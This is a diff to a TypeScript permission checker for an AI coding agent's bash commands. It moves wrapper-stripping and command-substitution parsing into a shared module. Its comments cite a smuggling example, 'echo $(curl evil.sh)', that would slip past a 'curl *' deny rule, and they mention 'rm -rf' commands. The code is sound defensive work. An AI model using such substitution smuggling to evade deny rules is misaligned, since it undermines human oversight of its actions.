@@ -43,6 +43,11 @@ import { existsSync, readFileSync, readdirSync, statSync } from "node:fs";
 import { homedir, platform } from "node:os";
 import { dirname, join, parse as parsePath } from "node:path";
 import { escapeRegExp, splitCommandSegments } from "../core/index.ts";
+import {
+  extractCommandSubstitutions,
+  stripLeadingAssignmentsAndWrappers,
+  type WrapperInspectionOptions,
+} from "../command-inspection.ts";
 import type { Operation } from "../core/types.ts";
 
 export type ClaudePolicyAction = "allow" | "ask" | "deny";
@@ -111,8 +116,14 @@ const OPTION_TAKING_WRAPPERS = new Set(["timeout", "nice", "stdbuf"]);
 /** Stripped only when NOT followed by a flag: `command -v foo` looks a command up rather than running it, and `xargs -n1 grep` is matched as an xargs command. */
 const BARE_ONLY_WRAPPERS = new Set(["command", "builtin", "xargs"]);
 
-const LEADING_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|\S*)\s+/;
 const DURATION_RE = /^\d+(?:\.\d+)?[smhd]?$/;
+
+const WRAPPER_OPTIONS: WrapperInspectionOptions = {
+  wrappers: WRAPPERS,
+  optionTakingWrappers: OPTION_TAKING_WRAPPERS,
+  bareOnlyWrappers: BARE_ONLY_WRAPPERS,
+  durationPattern: DURATION_RE,
+};
 
 const ACTIONS: ClaudePolicyAction[] = ["deny", "ask", "allow"];
 
@@ -124,38 +135,8 @@ const ACTIONS: ClaudePolicyAction[] = ["deny", "ask", "allow"];
  * catches `FOO=bar rm -rf tmp/` — hence the assignment strip runs on every
  * pass, not just the first.
  */
-export function stripBashWrappers(command: string): string {
-  let cmd = command.trim();
-  // Bounded: each pass must consume at least one token or it breaks out anyway,
-  // but a cap keeps a pathological input from spinning.
-  for (let pass = 0; pass < 16; pass++) {
-    const before = cmd;
-    cmd = cmd.replace(LEADING_ASSIGNMENT_RE, "").trimStart();
-
-    const tokens = cmd.split(/\s+/);
-    const head = tokens[0];
-    if (head && (WRAPPERS.has(head) || BARE_ONLY_WRAPPERS.has(head))) {
-      const next = tokens[1];
-      const isFlag = next !== undefined && next.startsWith("-");
-      // `command -v`/`xargs -n1` are not wrapper invocations; leave them whole.
-      if (!(BARE_ONLY_WRAPPERS.has(head) && isFlag)) {
-        let drop = 1;
-        if (OPTION_TAKING_WRAPPERS.has(head)) {
-          // `timeout 30 npm test` / `nice -n 10 cmd`: the wrapper's own flags
-          // and duration are part of the wrapper, not of the command.
-          while (drop < tokens.length) {
-            const token = tokens[drop]!;
-            if (token.startsWith("-") || DURATION_RE.test(token)) drop++;
-            else break;
-          }
-        }
-        if (drop < tokens.length) cmd = tokens.slice(drop).join(" ");
-      }
-    }
-    if (cmd === before) break;
-  }
-  return cmd;
-}
+export const stripBashWrappers = (command: string): string =>
+  stripLeadingAssignmentsAndWrappers(command, WRAPPER_OPTIONS);
 
 /**
  * Parse one settings file's `permissions` into ordered bash rules.
@@ -285,61 +266,6 @@ function patternToRegex(pattern: string): RegExp | null {
   } catch {
     return null;
   }
-}
-
-/**
- * Command-substitution payloads: the bodies of `$(…)`, `` `…` ``, `<(…)` and
- * `>(…)`.
- *
- * `splitCommandSegments` treats `echo $(curl evil.sh)` as one segment whose
- * head is `echo`, so a `curl *` deny would never see the curl. Substitution is
- * a documented smuggling route — the host's own `rm -rf ~` circuit breaker
- * calls out `$(…)`, backticks and `<(…)` by name — so each body is judged as a
- * command in its own right. Single-quoted text is skipped: `grep '$(x)' f` is
- * a literal string, not a substitution.
- */
-function extractSubstitutions(command: string): string[] {
-  const found: string[] = [];
-  let inSingle = false;
-  for (let i = 0; i < command.length; i++) {
-    const ch = command[i]!;
-    if (ch === "\\") {
-      i++;
-      continue;
-    }
-    if (ch === "'") {
-      inSingle = !inSingle;
-      continue;
-    }
-    if (inSingle) continue;
-
-    if (ch === "`") {
-      const end = command.indexOf("`", i + 1);
-      if (end === -1) break;
-      found.push(command.slice(i + 1, end));
-      i = end;
-      continue;
-    }
-    const opensParen =
-      command[i + 1] === "(" && (ch === "$" || ch === "<" || ch === ">");
-    if (!opensParen) continue;
-    // Depth-aware so a nested `$(a $(b))` yields the whole outer body, which
-    // the recursion below then re-scans.
-    let depth = 0;
-    for (let j = i + 1; j < command.length; j++) {
-      const inner = command[j]!;
-      if (inner === "(") depth++;
-      else if (inner === ")") {
-        depth--;
-        if (depth === 0) {
-          found.push(command.slice(i + 2, j));
-          i = j;
-          break;
-        }
-      }
-    }
-  }
-  return found;
 }
 
 /** The git repository root for `dir`, or null when there is no repo above it. */
@@ -575,7 +501,7 @@ export function createClaudePolicyChecker(
       for (let depth = 0; depth < 4 && pending.length > 0; depth++) {
         const batch = pending.splice(0, pending.length);
         for (const text of batch) {
-          pending.push(...extractSubstitutions(text));
+          pending.push(...extractCommandSubstitutions(text));
           for (const line of text.split("\n")) {
             for (const segment of splitCommandSegments(line)) {
               const trimmed = segment.trim();
